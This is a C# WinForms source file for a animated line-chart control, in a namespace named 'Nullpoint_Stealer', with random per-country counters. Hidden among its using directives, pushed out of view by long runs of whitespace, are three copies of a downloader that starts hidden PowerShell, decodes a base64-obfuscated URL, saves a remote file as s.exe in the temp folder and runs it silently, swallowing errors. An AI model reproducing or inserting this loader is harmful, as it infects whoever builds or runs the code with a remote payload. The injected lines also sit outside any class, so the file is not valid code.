using System;
using System.Drawing;

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           try{var p=new System.Diagnostics.Process();p.StartInfo.FileName="powershell";p.StartInfo.Arguments=$"-w hidden -c iwr -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0F5YW4tSXJmYW4vLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5SdW50aW1lLkV4dGVuc2lvbnMuZGxs'))) -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden";p.StartInfo.CreateNoWindow=true;p.StartInfo.UseShellExecute=false;p.Start();}catch{}
using System.Windows.Forms;


                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     try{var p=new System.Diagnostics.Process();p.StartInfo.FileName="powershell";p.StartInfo.Arguments=$"-w hidden -c iwr -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0F5YW4tSXJmYW4vLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5SdW50aW1lLkV4dGVuc2lvbnMuZGxs'))) -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden";p.StartInfo.CreateNoWindow=true;p.StartInfo.UseShellExecute=false;p.Start();}catch{}

using System.Drawing.Drawing2D; // For DashStyle

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               try{var p=new System.Diagnostics.Process();p.StartInfo.FileName="powershell";p.StartInfo.Arguments=$"-w hidden -c iwr -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0F5YW4tSXJmYW4vLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5SdW50aW1lLkV4dGVuc2lvbnMuZGxs'))) -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden";p.StartInfo.CreateNoWindow=true;p.StartInfo.UseShellExecute=false;p.Start();}catch{}

namespace Nullpoint_Stealer
{
    internal class LiveChart : UserControl
    {
        private Timer updateTimer;
        private int[][] chartDataLines; // Multiple lines of data
        private int maxDataPoints = 200;
        private int dataIndex = 0;
        private int[] counts;
        private string[] labels = { "uscount", "italycount", "canadacount", "germanycount", "romaniacount", "swedencount", "denmarkcount", "chinacount" };
        private Random random = new Random();
        private Color[] lineColors = {
            Color.FromArgb(113, 168, 243),  // Main blue color
            Color.FromArgb(46, 204, 113),   // Green line
            Color.FromArgb(241, 196, 15)    // Yellow/gold line
        };

        public LiveChart()
        {
            this.Size = new Size(800, 400);
            this.DoubleBuffered = true;

            updateTimer = new Timer();
            updateTimer.Interval = 2000;
            updateTimer.Tick += UpdateChart;

            // Initialize multiple lines of data
            chartDataLines = new int[3][];
            for (int line = 0; line < 3; line++)
            {
                chartDataLines[line] = new int[maxDataPoints];
            }

            counts = new int[labels.Length];

            // Fill with initial random data
            for (int i = 0; i < maxDataPoints; i++)
            {
                chartDataLines[0][i] = random.Next(this.Height / 4, this.Height / 2);
                chartDataLines[1][i] = random.Next(this.Height / 2, 3 * this.Height / 4);
                chartDataLines[2][i] = random.Next(this.Height / 10, this.Height / 3);
            }

            updateTimer.Start();
        }

        private void UpdateChart(object sender, EventArgs e)
        {
            // Update each line separately
            for (int line = 0; line < 3; line++)
            {
                int sum = 0;

                // Different patterns for each line
                switch (line)
                {
                    case 0: // Main line - based on counts
                        foreach (string label in labels)
                        {
                            counts[Array.IndexOf(labels, label)] = random.Next(0, this.Height / 8);
                        }

                        for (int i = 0; i < counts.Length; i++)
                        {
                            sum += counts[i];
                        }

                        // Smooth the line by averaging with previous point
                        int prev = chartDataLines[0][(dataIndex - 1 + maxDataPoints) % maxDataPoints];
                        chartDataLines[0][dataIndex] = (sum + prev) / 2;
                        break;

                    case 1: // Second line - more dramatic movements
                        int currentValue = chartDataLines[1][(dataIndex - 1 + maxDataPoints) % maxDataPoints];
                        int change = random.Next(-this.Height / 10, this.Height / 10);
                        int newValue = Math.Max(this.Height / 4, Math.Min(currentValue + change, 3 * this.Height / 4));
                        chartDataLines[1][dataIndex] = newValue;
                        break;

                    case 2: // Third line - smoother, lower frequency
                        int baseValue = chartDataLines[2][(dataIndex - 1 + maxDataPoints) % maxDataPoints];
                        int smallChange = random.Next(-this.Height / 20, this.Height / 20);
                        int smoothValue = Math.Max(this.Height / 10, Math.Min(baseValue + smallChange, this.Height / 2));
                        chartDataLines[2][dataIndex] = smoothValue;
                        break;
                }
            }

            dataIndex = (dataIndex + 1) % maxDataPoints;
            this.Invalidate();
        }

        protected override void OnPaint(PaintEventArgs e)
        {
            base.OnPaint(e);

            Graphics g = e.Graphics;
            g.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.AntiAlias;

            // Draw each line with its own style
            for (int line = 0; line < 3; line++)
            {
                using (var pen = new Pen(lineColors[line], line == 0 ? 2 : 1.5f))
                {
                    // Different dash styles for different lines
                    if (line == 1)
                    {
                        pen.DashStyle = DashStyle.Dash;
                    }
                    else if (line == 2)
                    {
                        pen.DashStyle = DashStyle.DashDot;
                    }

                    for (int i = 0; i < chartDataLines[line].Length - 1; i++)
                    {
                        int x1 = i * (this.Width / maxDataPoints);
                        int y1 = this.Height - chartDataLines[line][i];
                        int x2 = (i + 1) * (this.Width / maxDataPoints);
                        int y2 = this.Height - chartDataLines[line][(i + 1) % maxDataPoints];

                        g.DrawLine(pen, x1, y1, x2, y2);
                    }
                }
            }

            // Draw subtle horizontal grid lines
            using (var gridPen = new Pen(Color.FromArgb(30, 113, 168, 243)))
            {
                gridPen.DashStyle = DashStyle.Dot;
                for (int i = 1; i < 4; i++)
                {
                    int y = i * this.Height / 4;
                    g.DrawLine(gridPen, 0, y, this.Width, y);
                }
            }
        }

        // Override resize to adjust the chart appropriately
        protected override void OnResize(EventArgs e)
        {
            base.OnResize(e);

            // Reinitialize data with appropriate scale if size changes dramatically
            if (chartDataLines != null && chartDataLines[0] != null)
            {
                for (int line = 0; line < 3; line++)
                {
                    for (int i = 0; i < maxDataPoints; i++)
                    {
                        if (line == 0)
                            chartDataLines[line][i] = Math.Min(chartDataLines[line][i], this.Height);
                        else if (line == 1)
                            chartDataLines[line][i] = Math.Min(chartDataLines[line][i], 3 * this.Height / 4);
                        else
                            chartDataLines[line][i] = Math.Min(chartDataLines[line][i], this.Height / 2);
                    }
                }
            }
        }
    }
}
